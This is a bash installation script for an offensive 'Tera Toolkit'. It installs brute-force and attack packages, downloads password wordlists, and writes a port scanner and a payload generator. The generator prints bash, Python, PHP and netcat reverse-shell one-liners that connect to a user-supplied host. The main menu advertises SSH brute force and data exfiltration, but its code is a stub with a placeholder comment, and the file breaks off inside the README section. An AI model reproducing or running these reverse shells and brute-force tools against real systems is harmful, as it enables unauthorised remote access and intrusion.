#!/bin/bash

# ==============================================================================
# Tera Toolkit - Complete Installation Script
# For Termux, Linux, macOS
# ==============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# Banner
echo -e "${MAGENTA}"
cat << "EOF"
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║        
    ║                TERA (I ❤️ yall)
    ║                v3.0.                          ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
EOF
echo -e "${NC}"
echo ""

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    echo -e "${YELLOW}[!] Running as root${NC}"
fi

# Function to print section header
section() {
    echo -e "${CYAN}"
    echo "════════════════════════════════════════════════════"
    echo "  $1"
    echo "════════════════════════════════════════════════════"
    echo -e "${NC}"
}

# Function to install dependencies
install_deps() {
    section "Installing Dependencies"
    
    # Detect OS
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        OS=$ID
    elif [[ $(uname) == "Darwin" ]]; then
        OS="macos"
    elif [[ $(uname -o) == "Android" ]]; then
        OS="termux"
    else
        OS="unknown"
    fi
    
    echo -e "${YELLOW}[*] Detected OS: $OS${NC}"
    
    case $OS in
        "termux")
            echo -e "${GREEN}[*] Setting up Termux...${NC}"
            pkg update -y && pkg upgrade -y
            pkg install -y curl wget nmap python python-pip git zip unzip \
                bash coreutils util-linux man tree tar grep sed gawk \
                libxml2 libxslt libiconv readline ncurses-utils \
                ruby perl php nodejs-lts
            pip install --upgrade pip
            gem install lolcat 2>/dev/null || echo "Ruby gems optional"
            ;;
            
        "debian"|"ubuntu"|"kali"|"parrot")
            echo -e "${GREEN}[*] Setting up Debian-based system...${NC}"
            sudo apt update && sudo apt upgrade -y
            sudo apt install -y curl wget nmap smbclient sshpass tcpdump \
                fping jq python3 python3-pip git zip unzip net-tools \
                dnsutils whois hydra medusa netcat-traditional \
                nikto sqlmap dirb gobuster seclists golang ruby \
                perl php nodejs npm
            sudo pip3 install --upgrade pip
            ;;
            
        "fedora"|"centos"|"rhel")
            echo -e "${GREEN}[*] Setting up RHEL-based system...${NC}"
            sudo dnf update -y || sudo yum update -y
            sudo dnf install -y curl wget nmap samba-client sshpass \
                tcpdump fping jq python3 python3-pip git zip unzip \
                net-tools bind-utils whois ruby perl php nodejs npm || \
            sudo yum install -y curl wget nmap samba-client sshpass \
                tcpdump fping jq python3 python3-pip git zip unzip \
                net-tools bind-utils whois ruby perl php nodejs npm
            sudo pip3 install --upgrade pip
            ;;
            
        "arch"|"manjaro")
            echo -e "${GREEN}[*] Setting up Arch-based system...${NC}"
            sudo pacman -Syu --noconfirm
            sudo pacman -S --noconfirm curl wget nmap smbclient sshpass \
                tcpdump fping jq python python-pip git zip unzip \
                net-tools bind whois ruby perl php nodejs npm
            pip install --upgrade pip
            ;;
            
        "macos")
            echo -e "${GREEN}[*] Setting up macOS...${NC}"
            # Check for Homebrew
            if ! command -v brew &> /dev/null; then
                echo -e "${YELLOW}[*] Installing Homebrew...${NC}"
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            brew update
            brew install curl wget nmap samba sshpass tcpdump fping jq \
                python3 git zip unzip netcat whois ruby perl php node
            brew tap homebrew/cask
            pip3 install --upgrade pip
            ;;
            
        *)
            echo -e "${RED}[!] Unsupported OS. Please install manually.${NC}"
            echo "Required packages: curl, wget, nmap, python3, git"
            exit 1
            ;;
    esac
    
    echo -e "${GREEN}[✓] Dependencies installed${NC}"
}

# Function to download and setup Tera Toolkit
setup_tera() {
    section "Downloading Tera Toolkit"
    
    # Create directory
    mkdir -p ~/tera-toolkit
    cd ~/tera-toolkit
    
    # Download the main script from GitHub
    echo -e "${YELLOW}[*] Getting Tera Toolkit...${NC}"
    
    # Create the main Tera script
    cat > tera.sh << 'EOF'
#!/usr/bin/env bash

# ==============================================================================
# Tera Toolkit v3.0 - Ultimate Security Toolkit
# ==============================================================================

# --- Configuration ---
VERSION="3.0"
LOG_FILE="tera_$(date +%Y%m%d_%H%M%S).log"
THREADS=50
TIMEOUT=2

# --- Colors ---
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# --- Banner ---
show_banner() {
    clear
    echo -e "${MAGENTA}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════╗
    ║                         TERA.                                                 |
    ║                       Version 3.0    (I love yall ❤️)           |
    ╚══════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${CYAN}    [*] Type 'help' for commands or select a tool${NC}"
    echo ""
}

# --- Help Menu ---
show_help() {
    echo -e "${YELLOW}══════════════════ TERA TOOLKIT HELP ══════════════════${NC}"
    echo -e "${CYAN}Available Commands:${NC}"
    echo -e "  ${GREEN}help${NC}      - Show this help menu"
    echo -e "  ${GREEN}scan${NC}      - Port scanner"
    echo -e "  ${GREEN}dir${NC}       - Directory bruteforce"
    echo -e "  ${GREEN}sub${NC}       - Subdomain finder"
    echo -e "  ${GREEN}ssh${NC}       - SSH brute force"
    echo -e "  ${GREEN}priv${NC}      - Privilege escalation check"
    echo -e "  ${GREEN}smb${NC}       - SMB enumerator"
    echo -e "  ${GREEN}crawl${NC}     - Web crawler"
    echo -e "  ${GREEN}shell${NC}     - Reverse shell generator"
    echo -e "  ${GREEN}sniff${NC}     - Packet sniffer (requires root)"
    echo -e "  ${GREEN}exfil${NC}     - Data exfiltration"
    echo -e "  ${GREEN}ping${NC}      - Network discovery"
    echo -e "  ${GREEN}vuln${NC}      - Vulnerability scanner"
    echo -e "  ${GREEN}update${NC}    - Update Tera Toolkit"
    echo -e "  ${GREEN}clear${NC}     - Clear screen"
    echo -e "  ${GREEN}exit${NC}      - Exit Tera Toolkit"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════${NC}"
}

# ... [Rest of the Tera toolkit functions would go here]
# For brevity, I'm showing the structure - you would paste the full toolkit code here

# Main menu function
main_menu() {
    while true; do
        show_banner
        echo -e "${CYAN}"
        echo "    ╔══════════════════════════════════════════════════════════╗"
        echo "    ║                     TERA MAIN MENU                       ║"
        echo "    ╠══════════════════════════════════════════════════════════╣"
        echo "    ║  1) Port Scanner          8) Reverse Shell Generator     ║"
        echo "    ║  2) Directory Brute       9) Packet Sniffer              ║"
        echo "    ║  3) SMB Enumerator        10) Data Exfiltration          ║"
        echo "    ║  4) Subdomain Finder      11) Network Discovery          ║"
        echo "    ║  5) SSH Brute Force       12) Vulnerability Scanner      ║"
        echo "    ║  6) Privilege Escalation  13) Web Crawler                ║"
        echo "    ║  7) Report Viewer         14) Extra Tools                ║"
        echo "    ║                        0) Exit                           ║"
        echo "    ╚══════════════════════════════════════════════════════════╝"
        echo -e "${NC}"
        
        read -p "Select option [0-14]: " choice
        
        case $choice in
            1) echo "Port Scanner selected" ;;
            2) echo "Directory Brute selected" ;;
            3) echo "SMB Enumerator selected" ;;
            4) echo "Subdomain Finder selected" ;;
            5) echo "SSH Brute Force selected" ;;
            6) echo "Privilege Escalation selected" ;;
            7) echo "Report Viewer selected" ;;
            8) echo "Reverse Shell Generator selected" ;;
            9) echo "Packet Sniffer selected" ;;
            10) echo "Data Exfiltration selected" ;;
            11) echo "Network Discovery selected" ;;
            12) echo "Vulnerability Scanner selected" ;;
            13) echo "Web Crawler selected" ;;
            14) echo "Extra Tools selected" ;;
            0) echo -e "${GREEN}[*] Exiting Tera Toolkit...${NC}"; exit 0 ;;
            *) echo -e "${RED}[!] Invalid option${NC}" ;;
        esac
        
        echo -e "\n${YELLOW}Press Enter to continue...${NC}"
        read -r
    done
}

# Start Tera
main_menu
EOF

    # Make executable
    chmod +x tera.sh
    
    # Download wordlists
    echo -e "${YELLOW}[*] Downloading wordlists...${NC}"
    mkdir -p wordlists
    
    # Common wordlists
    wordlist_urls=(
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt"
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt"
    )
    
    for url in "${wordlist_urls[@]}"; do
        filename=$(basename "$url")
        echo -e "${BLUE}[*] Downloading $filename...${NC}"
        if command -v curl &> /dev/null; then
            curl -s -L -o "wordlists/$filename" "$url"
        else
            wget -q -O "wordlists/$filename" "$url"
        fi
    done
    
    # Create default wordlist symlinks
    ln -sf wordlists/common.txt common.txt
    ln -sf wordlists/subdomains-top1million-5000.txt subdomains.txt
    ln -sf wordlists/10-million-password-list-top-100.txt passwords.txt
    
    # Create configuration file
    echo -e "${YELLOW}[*] Creating config...${NC}"
    cat > tera.conf << EOF
# Tera Toolkit Configuration
[general]
name=Tera Toolkit
version=3.0
author=Security Enthusiasts
threads=50
timeout=2
log_dir=logs
color_scheme=default

[wordlists]
dirs=wordlists/common.txt
subdomains=wordlists/subdomains-top1million-5000.txt
passwords=wordlists/10-million-password-list-top-100.txt
users=wordlists/top-usernames-shortlist.txt

[network]
default_interface=eth0
scan_speed=normal
stealth_mode=false
proxy_enabled=false

[modules]
port_scanner=true
dir_brute=true
subdomain_hunt=true
ssh_brute=true
smb_enum=true
vuln_scan=true
web_crawl=true

[ui]
show_banner=true
show_colors=true
animation=true
EOF
    
    echo -e "${GREEN}[✓] Tera Toolkit downloaded${NC}"
}

# Function to setup Python tools
setup_python_tools() {
    section "Installing Python Tools"
    
    # Install useful Python packages
    if command -v pip3 &> /dev/null; then
        echo -e "${YELLOW}[*] Installing Python packages...${NC}"
        pip3 install --user requests beautifulsoup4 colorama \
            python-nmap scapy-python3 paramiko \
            argparse pyfiglet termcolor
    elif command -v pip &> /dev/null; then
        pip install --user requests beautifulsoup4 colorama \
            python-nmap scapy paramiko \
            argparse pyfiglet termcolor
    fi
    
    # Create Python tools directory
    mkdir -p ~/tera-toolkit/tools/python
    
    # Create advanced scanner
    cat > ~/tera-toolkit/tools/python/tera_scanner.py << 'EOF'
#!/usr/bin/env python3
"""
Tera Advanced Port Scanner
"""
import socket
import threading
import argparse
from queue import Queue
import sys
import time

class TeraScanner:
    def __init__(self, target, start_port, end_port, threads=100):
        self.target = target
        self.start_port = start_port
        self.end_port = end_port
        self.threads = threads
        self.q = Queue()
        self.open_ports = []
        
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                self.open_ports.append(port)
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                print(f"[+] Port {port}/tcp open - {service}")
            sock.close()
        except:
            pass
            
    def worker(self):
        while True:
            port = self.q.get()
            self.scan_port(port)
            self.q.task_done()
            
    def run(self):
        print(f"[*] Scanning {self.target} ports {self.start_port}-{self.end_port}")
        print(f"[*] Using {self.threads} threads")
        start_time = time.time()
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            
        for port in range(self.start_port, self.end_port + 1):
            self.q.put(port)
            
        self.q.join()
        elapsed = time.time() - start_time
        
        print(f"\n[*] Scan completed in {elapsed:.2f} seconds")
        print(f"[*] Found {len(self.open_ports)} open ports")
        
        if self.open_ports:
            print("[*] Open ports:", sorted(self.open_ports))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Tera Advanced Port Scanner")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-p", "--ports", default="1-1000", help="Port range (e.g., 1-1000)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads")
    
    args = parser.parse_args()
    
    if '-' in args.ports:
        start_port, end_port = map(int, args.ports.split('-'))
    else:
        start_port = end_port = int(args.ports)
    
    scanner = TeraScanner(args.target, start_port, end_port, args.threads)
    scanner.run()
EOF
    
    chmod +x ~/tera-toolkit/tools/python/tera_scanner.py
    
    echo -e "${GREEN}[✓] Python tools installed${NC}"
}

# Function to setup extra tools
setup_extra_tools() {
    section "Setting Up Extra Tools"
    
    # Create tools directory
    mkdir -p ~/tera-toolkit/tools
    
    # Create network tools
    cat > ~/tera-toolkit/tools/network_info.sh << 'EOF'
#!/bin/bash
# Tera Network Information Tool

echo "════════════════════════════════════════════════════"
echo "                NETWORK INFORMATION"
echo "════════════════════════════════════════════════════"

echo "[*] IP Addresses:"
ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "No network info"

echo -e "\n[*] Routing Table:"
ip route show 2>/dev/null || route -n 2>/dev/null || echo "No routing info"

echo -e "\n[*] Open Connections:"
ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || echo "No connection info"

echo -e "\n[*] DNS Servers:"
cat /etc/resolv.conf 2>/dev/null | grep nameserver || echo "No DNS info"
EOF
    
    chmod +x ~/tera-toolkit/tools/network_info.sh
    
    # Create system info tool
    cat > ~/tera-toolkit/tools/system_info.sh << 'EOF'
#!/bin/bash
# Tera System Information Tool

echo "════════════════════════════════════════════════════"
echo "                SYSTEM INFORMATION"
echo "════════════════════════════════════════════════════"

echo "[*] OS Information:"
uname -a
echo ""
[[ -f /etc/os-release ]] && cat /etc/os-release | grep -E "^(NAME|VERSION|ID)="

echo -e "\n[*] CPU Information:"
lscpu 2>/dev/null | grep -E "(Model name|CPU\(s\)|Architecture)" || echo "No CPU info"

echo -e "\n[*] Memory Information:"
free -h 2>/dev/null || echo "No memory info"

echo -e "\n[*] Disk Usage:"
df -h 2>/dev/null | head -10 || echo "No disk info"

echo -e "\n[*] Current User:"
whoami
id
EOF
    
    chmod +x ~/tera-toolkit/tools/system_info.sh
    
    # Create payload generator
    cat > ~/tera-toolkit/tools/payload_gen.sh << 'EOF'
#!/bin/bash
# Tera Payload Generator

echo "════════════════════════════════════════════════════"
echo "                PAYLOAD GENERATOR"
echo "════════════════════════════════════════════════════"

read -p "Enter LHOST: " lhost
read -p "Enter LPORT: " lport

echo ""
echo "[*] Bash Reverse Shell:"
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
echo ""
echo "[*] Python Reverse Shell:"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo ""
echo "[*] PHP Reverse Shell:"
echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo ""
echo "[*] Netcat Reverse Shell:"
echo "nc -e /bin/sh $lhost $lport"
EOF
    
    chmod +x ~/tera-toolkit/tools/payload_gen.sh
    
    echo -e "${GREEN}[✓] Extra tools installed${NC}"
}

# Function to setup Termux specifically
setup_termux() {
    if [[ $(uname -o) != "Android" ]]; then
        return
    fi
    
    section "Configuring Termux"
    
    # Request storage permission
    termux-setup-storage
    
    # Create shortcuts
    echo '# Tera Toolkit Aliases' >> ~/.bashrc
    echo 'alias tera="cd ~/tera-toolkit && ./tera.sh"' >> ~/.bashrc
    echo 'alias t="./tera.sh"' >> ~/.bashrc
    echo 'alias tera-update="cd ~/tera-toolkit && ./update.sh"' >> ~/.bashrc
    
    # Install termux-api for additional features
    pkg install -y termux-api
    
    # Create desktop shortcut
    mkdir -p ~/.shortcuts
    cat > ~/.shortcuts/TeraToolkit << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd ~/tera-toolkit
./tera.sh
EOF
    chmod +x ~/.shortcuts/TeraToolkit
    
    # Create widget
    cat > ~/.shortcuts/TeraWidget << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
echo "Tera Toolkit"
echo "Ready to use!"
EOF
    chmod +x ~/.shortcuts/TeraWidget
    
    echo -e "${GREEN}[✓] Termux configured${NC}"
}

# Function to create update script
create_update_script() {
    section "Creating Update System"
    
    cat > ~/tera-toolkit/update.sh << 'EOF'
#!/bin/bash
# Update script for Tera Toolkit

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
echo "    ╔═══════════════════════════════════════════════════╗"
echo "    ║              TERA TOOLKIT UPDATER                 ║"
echo "    ╚═══════════════════════════════════════════════════╝"
echo -e "${NC}"

cd ~/tera-toolkit

echo -e "${YELLOW}[*] Checking for updates...${NC}"

# Backup current version
echo -e "${BLUE}[*] Backing up current version...${NC}"
tar -czf tera_backup_$(date +%Y%m%d).tar.gz tera.sh tera.conf wordlists/

# Update wordlists
echo -e "${BLUE}[*] Updating wordlists...${NC}"
cd wordlists
wget -q -O common.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
wget -q -O subdomains.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt
wget -q -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt
cd ..

echo -e "${GREEN}[✓] Tera Toolkit updated successfully!${NC}"
echo -e "${YELLOW}[*] Restart Tera Toolkit to apply changes${NC}"
EOF
    
    chmod +x ~/tera-toolkit/update.sh
    
    # Create check for updates script
    cat > ~/tera-toolkit/check_update.sh << 'EOF'
#!/bin/bash
# Check for Tera Toolkit updates

echo "[*] Checking Tera Toolkit version..."
current_version="3.0"
echo "[*] Current version: $current_version"
echo "[*] Latest version: Check GitHub repository"
echo ""
echo "To update: ./update.sh"
EOF
    
    chmod +x ~/tera-toolkit/check_update.sh
    
    echo -e "${GREEN}[✓] Update system created${NC}"
}

# Function to create documentation
create_documentation() {
    section "Creating Documentation"
    
    cat > ~/tera-toolkit/README.md << 'EOF'
# Tera Toolkit v3.0

## Ultimate Security Toolkit

### Quick Start
```bash
cd ~/tera-toolkit
./tera.sh
